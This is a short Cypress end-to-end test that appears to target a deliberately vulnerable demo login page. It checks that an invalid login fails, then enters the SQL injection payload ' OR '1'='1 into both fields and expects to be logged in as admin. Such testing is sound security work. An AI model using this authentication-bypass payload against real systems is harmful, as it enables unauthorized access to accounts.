describe('SQL Injection Tests', () => {
    it('should login as admin using SQL Injection', () => {
        cy.visit('/login.html');

        // Normal invalid login check
        cy.get('#username').type('wronguser');
        cy.get('#password').type('wrongpass');
        cy.get('#login-btn').click();
        cy.contains('Login Failed').should('be.visible');

        // Go back to login
        cy.visit('/login.html');

        // SQL Injection Attack
        // Payload: ' OR '1'='1
        // This makes the query: ... WHERE username = '' OR '1'='1' AND ...
        // Depending on query structure, it might bypassing authentication
        cy.get('#username').type("' OR '1'='1");
        cy.get('#password').type("' OR '1'='1");
        cy.get('#login-btn').click();

        // Expectation: Login should be successful
        cy.contains('Login Successful!').should('be.visible');
        // The mock DB returns the first user found which matches the condition (often admin)
        cy.contains('Welcome, admin').should('be.visible');
    });
});
